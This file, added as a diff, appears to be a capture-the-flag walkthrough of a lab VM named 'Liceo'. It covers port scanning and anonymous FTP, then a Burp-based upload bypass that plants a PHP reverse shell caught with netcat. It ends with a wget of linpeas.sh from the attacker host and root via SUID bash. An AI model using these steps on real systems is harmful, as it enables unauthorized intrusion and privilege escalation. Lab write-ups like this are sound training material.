@@ -1,0 +1,483 @@
+				ENUMERATION
+
+---ifconfig---        
+                                                                                                                               
+┌──(root㉿kali)-[/home/okina/Desktop]
+└─# ifconfig
+eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
+        inet 10.0.2.15  netmask 255.255.255.0  broadcast 10.0.2.255
+        inet6 fe80::a00:27ff:fef6:e3c3  prefixlen 64  scopeid 0x20<link>
+        ether 08:00:27:f6:e3:c3  txqueuelen 1000  (Ethernet)
+        RX packets 77822  bytes 16470359 (15.7 MiB)
+        RX errors 0  dropped 0  overruns 0  frame 0
+        TX packets 76584  bytes 5117760 (4.8 MiB)
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+
+lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
+        inet 127.0.0.1  netmask 255.0.0.0
+        inet6 ::1  prefixlen 128  scopeid 0x10<host>
+        loop  txqueuelen 1000  (Local Loopback)
+        RX packets 530  bytes 54848 (53.5 KiB)
+        RX errors 0  dropped 0  overruns 0  frame 0
+        TX packets 530  bytes 54848 (53.5 KiB)
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+
+
+                                                                             
+---netdiscover---                                                                                                                                       
+
+┌──(root㉿kali)-[/home/okina/Desktop]
+└─# netdiscover -i eth0 -r 10.0.2.0/24 -c 200
+
+ Currently scanning: 10.0.2.0/24   |   Screen View: Unique Hosts                                                                      
+                                                                                                                                      
+ 16 Captured ARP Req/Rep packets, from 4 hosts.   Total size: 960                                                                     
+ _____________________________________________________________________________
+   IP            At MAC Address     Count     Len  MAC Vendor / Hostname      
+ -----------------------------------------------------------------------------
+ 10.0.2.1        52:54:00:12:35:00      4     240  Unknown vendor                                                                     
+ 10.0.2.2        52:54:00:12:35:00      4     240  Unknown vendor                                                                     
+ 10.0.2.3        08:00:27:bf:dc:69      4     240  PCS Systemtechnik GmbH                                                             
+ 10.0.2.29       08:00:27:3c:8e:b8      4     240  PCS Systemtechnik GmbH                                                             
+
+zsh: suspended  netdiscover -i eth0 -r 10.0.2.0/24 -c 200
+                     
+
+---nmap---
+
+┌──(root㉿kali)-[/home/okina/Desktop]
+└─# nmap 10.0.2.29 -sS -sC -sV -A -T4 -p-  
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-03-28 23:56 +03
+Nmap scan report for 10.0.2.29
+Host is up (0.00071s latency).
+Not shown: 65532 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+21/tcp open  ftp     vsftpd 3.0.5
+| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+|_-rw-rw-r--    1 1000     1000          191 Feb 01 14:29 note.txt
+| ftp-syst: 
+|   STAT: 
+| FTP server status:
+|      Connected to ::ffff:10.0.2.15
+|      Logged in as ftp
+|      TYPE: ASCII
+|      No session bandwidth limit
+|      Session timeout in seconds is 300
+|      Control connection is plain text
+|      Data connections will be plain text
+|      At session startup, client count was 3
+|      vsFTPd 3.0.5 - secure, fast, stable
+|_End of status
+22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   256 68:4c:42:8d:10:2c:61:56:7b:26:c4:78:96:6d:28:15 (ECDSA)
+|_  256 7e:1a:29:d8:9b:91:44:bd:66:ff:6a:f3:2b:c7:35:65 (ED25519)
+80/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))
+|_http-title: Liceo
+|_http-server-header: Apache/2.4.52 (Ubuntu)
+MAC Address: 08:00:27:3C:8E:B8 (Oracle VirtualBox virtual NIC)
+Device type: general purpose
+Running: Linux 4.X|5.X
+OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
+OS details: Linux 4.15 - 5.8
+Network Distance: 1 hop
+Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE
+HOP RTT     ADDRESS
+1   0.71 ms 10.0.2.29
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 44.72 seconds
+
+
+
+---says anonymous ftp login is allowed---
+
+
+┌──(root㉿kali)-[/home/okina/Desktop]
+└─# ftp 10.0.2.29
+Connected to 10.0.2.29.
+220 (vsFTPd 3.0.5)
+Name (10.0.2.29:okina): Anonymous       
+331 Please specify the password.
+Password: 
+230 Login successful.
+Remote system type is UNIX.
+Using binary mode to transfer files.
+ftp> ls
+229 Entering Extended Passive Mode (|||8563|)
+150 Here comes the directory listing.
+-rw-rw-r--    1 1000     1000          191 Feb 01 14:29 note.txt
+226 Directory send OK.
+ftp> get note.txt
+local: note.txt remote: note.txt
+229 Entering Extended Passive Mode (|||60190|)
+150 Opening BINARY mode data connection for note.txt (191 bytes).
+100% |******************************************************************************************|   191       62.80 KiB/s    00:00 ETA
+226 Transfer complete.
+191 bytes received in 00:00 (14.23 KiB/s)
+
+
+
+---downloaded to Desktop, lets check the content of the note---
+
+┌──(root㉿kali)-[/home/okina/Desktop]
+└─# cat note.txt 
+Hi Matias, I have left on the web the continuations of today's work, 
+would you mind contiuing in your turn and make sure that the web will be secure? 
+Above all, we dont't want intruders...
+  
+
+
+---we learn there is a developer named matias, lets do some web enum with dirb and/or gobuster---
+
+---there is not much from the dirb and gobuster scans, only a page named uploads which seems empty at the moment--- 
+
+---I used another tool named ctfenum to find if there are any more secret pages, this tool is pretty useful---
+
+---Usage---
+python3 /the_path_to_tool/CTFenum.py "Target IP adress"
+
+
+┌──(root㉿kali)-[/opt/CTFEnum/CTFenum]
+└─# python3 CTFenum.py 10.0.2.29
+======================================================================
+[!] Checking open ports
+======================================================================
+OPEN TCP PORTS:
+[!] nmap -Pn -T3 -n -p- 10.0.2.29
+PORT   STATE SERVICE
+21/tcp open  ftp
+22/tcp open  ssh
+80/tcp open  http
+MAC Address: 08:00:27:3C:8E:B8 (Oracle VirtualBox virtual NIC)
+======================================================================
+[!] Generating Nmap output
+======================================================================
+NMAP TCP OUTPUT:
+[!] nmap -T5 -n -Pn -sCV -p21,22,80 10.0.2.29
+PORT   STATE SERVICE VERSION
+21/tcp open  ftp     vsftpd 3.0.5
+| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+|_-rw-rw-r--    1 1000     1000          191 Feb 01 14:29 note.txt
+| ftp-syst: 
+|   STAT: 
+| FTP server status:
+|      Connected to ::ffff:10.0.2.15
+|      Logged in as ftp
+|      TYPE: ASCII
+|      No session bandwidth limit
+|      Session timeout in seconds is 300
+|      Control connection is plain text
+|      Data connections will be plain text
+|      At session startup, client count was 2
+|      vsFTPd 3.0.5 - secure, fast, stable
+|_End of status
+22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   256 68:4c:42:8d:10:2c:61:56:7b:26:c4:78:96:6d:28:15 (ECDSA)
+|_  256 7e:1a:29:d8:9b:91:44:bd:66:ff:6a:f3:2b:c7:35:65 (ED25519)
+80/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))
+|_http-server-header: Apache/2.4.52 (Ubuntu)
+|_http-title: Liceo
+MAC Address: 08:00:27:3C:8E:B8 (Oracle VirtualBox virtual NIC)
+Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+======================================================================
+[!] Attacking port 22
+[!] SSH
+[!] You can try to bruteforce credentials using [netexec|crackmapexec|hydra].
+netexec ssh $(IP) -u usernames.txt -p passwords.txt | grep -v fail
+======================================================================
+[!] Attacking port 21
+[+] Server have anonymous login enabled
+[+] FTP Credentials ftp: 
+======================================================================
+[!] Attacking port 80
+[!] Comments found in: http://10.0.2.29:80/
+<!-- Basic -->
+
+<!-- Mobile Metas -->
+
+<!-- Site Metas -->
+
+<!-- bootstrap core css -->
+
+<!-- Custom styles for this template -->
+
+<!-- responsive style -->
+
+<!-- header section strats -->
+
+<!-- end header section -->
+
+<!-- slider section -->
+
+<!-- end slider section -->
+
+<!-- experience section -->
+
+<!-- end experience section -->
+
+<!-- category section -->
+
+<!-- end category section -->
+
+<!-- about section -->
+
+<!-- end about section -->
+
+<!-- freelance section -->
+
+<!-- end freelance section -->
+
+<!-- client section -->
+
+<!-- end client section -->
+
+<!-- info section -->
+
+<!-- end info section -->
+
+<!-- footer section -->
+
+<!-- end  footer section -->
+
+js/jquery-3.4.1.min.js
+======================================================================
+[!] Attacking port 80
+[!] Apache server, Fuzzing for PHP files.
+[!] Apache/2.4.52 (Ubuntu)
+======================================================================
+[!] Attacking port 80
+[!] gobuster dir -u http://10.0.2.29:80 -w /opt/CTFEnum/CTFenum/mods/wordlist.txt -x .txt,.bak,.cgi,.html,.php -t 70 -z --no-error -k
+[!] URL: http://10.0.2.29:80
+
+/css                  (Status: 301) [Size: 304] [--> http://10.0.2.29/css/]
+/images               (Status: 301) [Size: 307] [--> http://10.0.2.29/images/]
+/index.html           (Status: 200) [Size: 21487]
+/js                   (Status: 301) [Size: 303] [--> http://10.0.2.29/js/]
+/uploads              (Status: 301) [Size: 308] [--> http://10.0.2.29/uploads/]
+/upload.php           (Status: 200) [Size: 371]
+
+======================================================================
+[!] Attacking port 80
+[!] Comments found in: http://10.0.2.29/js/
+>jquery-3.4.1.min.js</a></td><td align="right
+
+
+
+---here we see another page we have not seen before, upload.php page, lets try to upload something :)---
+
+
+---We can use an example reverse web shell php file within the kali machine at location /usr/share/webshells, and try to upload it to the form, but turns out this page doesn't accept php files, lets work around this---
+
+
+
+
+					FILE UPLOAD BYPASS
+
+
+---well, we can still upload a php file but change the type of it with burpsuite, so lets do that--- 
+
+
+Our webshell's port and id:
+LHOST = 10.0.2.15
+LPORT = 1234
+
+---lets turn our listener on---
+
+┌──(root㉿kali)-[/home/okina/Desktop]
+└─# nc -nvlp 1234
+listening on [any] 1234 ...
+
+
+
+---we adjust the proxy settings, then open burpsuite, we select our php file, start the intercept and then upload it---
+
+
+---now we will change the response part this way---
+
+-------------------------13594007755321462483964091250
+Content-Disposition: form-data; name="archivo"; filename="shell.phtml"
+Content-Type: application/x-php
+
+
+---only the filename to shell.phtml so that we can trick the form---
+
+---then we forward it, disable our proxy and then come to the 10.0.2.29/uploads page, we see our file there---
+
+---click on the file, come check our nc listener and here we have the connection---
+
+
+
+
+					GAINING FOOTHOLD
+
+┌──(root㉿kali)-[/home/okina/Desktop]
+└─# nc -nvlp 1234 
+listening on [any] 1234 ...
+connect to [10.0.2.15] from (UNKNOWN) [10.0.2.29] 50576
+Linux liceoserver 5.15.0-92-generic #102-Ubuntu SMP Wed Jan 10 09:33:48 UTC 2024 x86_64 x86_64 x86_64 GNU/Linux
+ 22:39:42 up  1:45,  0 users,  load average: 0.09, 0.03, 0.11
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+/bin/sh: 0: can't access tty; job control turned off
+$ whoami
+www-data
+$ ls         
+bin
+boot
+dev
+etc
+home
+lib
+lib32
+lib64
+libx32
+lost+found
+media
+mnt
+opt
+proc
+root
+run
+sbin
+snap
+srv
+sys
+tmp
+usr
+var
+$ cd home	
+$ ls
+dev
+$ cd dev
+$ ls
+user.txt
+$ cat user.txt	
+---First User Flag---
+
+
+
+---now lets upgrade this shell to tty so that we can start getting closer to having more privileges---
+
+$ python3 -c 'import pty; pty.spawn("/bin/bash")'
+bash-5.1$ 
+bash-5.1$ whoami
+whoami
+www-data
+
+
+---lets see what we can do with this user---
+
+bash-5.1$ sudo -l
+sudo -l
+[sudo] password for www-data:
+sudo: a password is required
+
+bash-5.1$ cat /etc/crontab
+cat /etc/crontab
+# /etc/crontab: system-wide crontab
+# Unlike any other crontab you don't have to run the `crontab'
+# command to install the new version when you edit this file
+# and files in /etc/cron.d. These files also have username fields,
+# that none of the other crontabs do.
+
+SHELL=/bin/sh
+# You can also override PATH, but by default, newer versions inherit it from the environment
+#PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
+
+# Example of job definition:
+# .---------------- minute (0 - 59)
+# |  .------------- hour (0 - 23)
+# |  |  .---------- day of month (1 - 31)
+# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
+# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
+# |  |  |  |  |
+# *  *  *  *  * user-name command to be executed
+17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
+25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
+47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
+52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
+#
+
+
+
+---so neither sudo -l nor crontab gave us something useful, lets use linpeas.sh, I downloaded it to /opt folder---
+
+---ı went to github page of linpeas and to then latest page, downloaded linpeas.sh from there---
+
+
+
+
+
+				PRIVILEGE ESCALATION
+
+
+---copy the linpeas.sh to /var/www/html, then start our server from kali---
+
+
+┌──(root㉿kali)-[/opt]
+└─# service apache2 start
+
+
+---then download it to our shell---
+
+bash-5.1$ cd /tmp
+cd /tmp
+
+wget http://10.0.2.15/backdoors/linpeas.sh
+wget http://10.0.2.15/backdoors/linpeas.sh
+--2024-03-29 09:58:57--  http://10.0.2.15/backdoors/linpeas.sh
+Connecting to 10.0.2.15:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 155112 (151K) [text/x-sh]
+Saving to: ‘linpeas.sh’
+
+linpeas.sh          100%[===================>] 151.48K  --.-KB/s    in 0.005s  
+
+2024-03-29 09:58:57 (28.7 MB/s) - ‘linpeas.sh’ saved [155112/155112]
+
+
+---now lets run it---
+
+bash-5.1$ bash linpeas.sh
+
+
+---once we run it, we start looking for expolitable vulnerabilities, linpeas shows it in a way that
+
+  RED/YELLOW: 95% a PE vector
+  RED: You should take a look to it
+  LightCyan: Users with console
+
+
+
+---we find this line---
+-rwsr-sr-x 1 root root 1.4M Jan  6  2022 /usr/bin/bash
+
+
+---and we see that /usr/bash/bin is red/yellow, we can perform attacks based on what we learned
+from this linpeas scan---
+
+
+---now we simply just have to---
+
+
+bash-5.1$ bash -p
+bash -p
+bash-5.1# whoami
+whoami
+root
+bash-5.1# ls
+ls
+linpeas.sh  tmux-33
+bash-5.1# cd /root
+cd /root
+bash-5.1# ls
+ls
+root.txt  snap
+bash-5.1# cat root.txt
+cat root.txt
+---Root User Flag---
+
